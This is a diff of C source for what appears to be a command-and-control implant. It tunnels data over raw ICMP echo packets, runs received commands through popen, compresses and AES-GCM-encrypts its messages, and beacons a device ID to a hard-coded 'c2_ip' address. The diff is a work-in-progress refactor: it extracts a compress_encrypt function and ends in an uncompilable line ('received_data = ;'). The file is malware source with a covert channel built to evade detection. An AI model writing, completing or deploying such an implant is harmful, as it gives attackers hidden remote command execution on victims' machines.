@@ -87,7 +87,7 @@ uint16_t calculate_checksum(const unsigned char *data, size_t length) {
 
 }
 
-ssize_t send_echo_request(struct in_addr destination_ip, uint16_t sequence, const unsigned char *data_to_send, size_t data_to_send_size, unsigned char *received_data) {
+ssize_t send_echo_request(struct in_addr destination_ip, uint16_t sequence, const unsigned char *data_to_send, size_t data_to_send_length, unsigned char *received_data) {
 
 	int fd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
 
@@ -102,12 +102,12 @@ ssize_t send_echo_request(struct in_addr destination_ip, uint16_t sequence, cons
 	request[5] = (unsigned char)identifier;
 	request[6] = (unsigned char)(sequence >> 8);
 	request[7] = (unsigned char)sequence;
-	memcpy(request + 8, data_to_send, data_to_send_size);
-	uint16_t checksum = calculate_checksum(request, sizeof(request) + data_to_send_size);
+	memcpy(request + 8, data_to_send, data_to_send_length);
+	uint16_t checksum = calculate_checksum(request, sizeof(request) + data_to_send_length);
 	request[2] = (unsigned char)(checksum >> 8);
 	request[3] = (unsigned char)checksum;
 
-	sendto(fd, request, sizeof(request) + data_to_send_size, 0, (struct sockaddr *)&destination, sizeof(destination));
+	sendto(fd, request, sizeof(request) + data_to_send_length, 0, (struct sockaddr *)&destination, sizeof(destination));
 
 
 	struct pollfd waiting_socket = {
@@ -139,11 +139,11 @@ ssize_t send_echo_request(struct in_addr destination_ip, uint16_t sequence, cons
 			continue;
 		}
 
-		size_t reply_data_size = response_length - ip_header_length - 8;
-		memcpy(received_data, reply + 8, reply_data_size);
+		size_t reply_data_length = response_length - ip_header_length - 8;
+		memcpy(received_data, reply + 8, reply_data_length);
 
 		close(fd);
-		return (ssize_t)reply_data_size;
+		return (ssize_t)reply_data_length;
 
 	}
 
@@ -151,7 +151,7 @@ ssize_t send_echo_request(struct in_addr destination_ip, uint16_t sequence, cons
 	return -1;
 }
 
-unsigned char *execute_task(const char *command, size_t *output_size) {
+unsigned char *execute_task(const char *command, size_t *output_length) {
 
 	FILE *process = popen(command, "r");
 
@@ -170,30 +170,20 @@ unsigned char *execute_task(const char *command, size_t *output_size) {
 
 	pclose(process);
 
-	*output_size = used_bytes;
+	*output_length = used_bytes;
 	return output;
 
 }
 
-int main() {
+unsigned char *compress_encrypt(const unsigned char *message, size_t message_length, int compression_level, size_t *data_to_send_length) {
 
-	struct Config configuration = {
-		.minimum_poll_seconds = 1,
-		.maximum_poll_seconds = 3,
-		.compression_level = 6
-	};
-
-	uint64_t device_id = get_device_id();
-
-	inet_pton(AF_INET, "192.168.67.20", &configuration.c2_ip);
-	srand((int)time(NULL) ^ (int)getpid());
-
-	char message[512];
-	sprintf(message, "%016" PRIx64, device_id);
-	uLong message_length = strlen(message);
-	uLongf compressed_length = compressBound(message_length);
+	uLongf compressed_length = compressBound((uLong)message_length);
 	unsigned char *compressed_data = malloc(compressed_length);
-	compress2(compressed_data, &compressed_length, (const unsigned char *)message, message_length, configuration.compression_level);
+	if (compress2(compressed_data, &compressed_length, message, (uLong)message_length, compression_level) != Z_OK) {
+		free(compressed_data);
+		*data_to_send_length = 0;
+		return NULL;
+	}
 
 	unsigned char nonce[12];
 	unsigned char authentication_tag[16];
@@ -209,54 +199,48 @@ int main() {
 	EVP_CIPHER_CTX_ctrl(encryption_context, EVP_CTRL_AEAD_GET_TAG, sizeof(authentication_tag), authentication_tag);
 	EVP_CIPHER_CTX_free(encryption_context);
 
-	size_t payload_length = sizeof(nonce) + sizeof(authentication_tag) + encrypted_length;
-	unsigned char *payload = malloc(payload_length);
-	memcpy(payload, nonce, sizeof(nonce));
-	memcpy(payload + sizeof(nonce), authentication_tag, sizeof(authentication_tag));
-	memcpy(payload + sizeof(nonce) + sizeof(authentication_tag), encrypted_data, encrypted_length);
-
-
-
-
-
-
-
-
-
-
-
-	unsigned char *decrypted_data = malloc(encrypted_length);
-	EVP_CIPHER_CTX *decryption_context = EVP_CIPHER_CTX_new();
-	int decrypted_length = 0;
-	int final_decrypted_length = 0;
-	EVP_DecryptInit_ex(decryption_context, EVP_aes_256_gcm(), NULL, ENCRYPTION_KEY, nonce);
-	EVP_DecryptUpdate(decryption_context, decrypted_data, &decrypted_length, encrypted_data, encrypted_length);
-	EVP_CIPHER_CTX_ctrl(decryption_context, EVP_CTRL_AEAD_SET_TAG, sizeof(authentication_tag), authentication_tag);
-	EVP_DecryptFinal_ex(decryption_context, decrypted_data + decrypted_length, &final_decrypted_length);
-	EVP_CIPHER_CTX_free(decryption_context);
-	decrypted_length += final_decrypted_length;
-
-	unsigned char decompressed_data[64];
-	uLongf decompressed_length = sizeof(decompressed_data) - 1;
-	uncompress(decompressed_data, &decompressed_length, decrypted_data, (uLong)decrypted_length);
-
-
-
-
-
-
-
-
-
-
-
-
-
+	size_t result_length = sizeof(nonce) + sizeof(authentication_tag) + (size_t)encrypted_length;
+	unsigned char *data_to_send = malloc(result_length);
+	memcpy(data_to_send, nonce, sizeof(nonce));
+	memcpy(data_to_send + sizeof(nonce), authentication_tag, sizeof(authentication_tag));
+	memcpy(data_to_send + sizeof(nonce) + sizeof(authentication_tag), encrypted_data, (size_t)encrypted_length);
 
 	free(compressed_data);
 	free(encrypted_data);
-	free(decrypted_data);
-	free(payload);
+
+	*data_to_send_length = result_length;
+	return data_to_send;
+
+}
+
+
+
+
+int main() {
+
+	struct Config configuration = {
+		.minimum_poll_seconds = 1,
+		.maximum_poll_seconds = 3,
+		.compression_level = 6
+	};
+
+	uint64_t device_id = get_device_id();
+
+	inet_pton(AF_INET, "192.168.67.20", &configuration.c2_ip);
+	srand((int)time(NULL) ^ (int)getpid());
+
+	char message[1024];
+	sprintf(message, "%016" PRIx64, device_id);
+
+	size_t data_to_send_length = 0;
+	unsigned char *data_to_send = compress_encrypt((const unsigned char *)message, strlen(message), configuration.compression_level, &data_to_send_length);
+
+
+	size_t received_data_length = 0;
+	unsigned char *received_data = ;
+
+	free(data_to_send);
+	free(received_data);
 
 	return 0;
 }
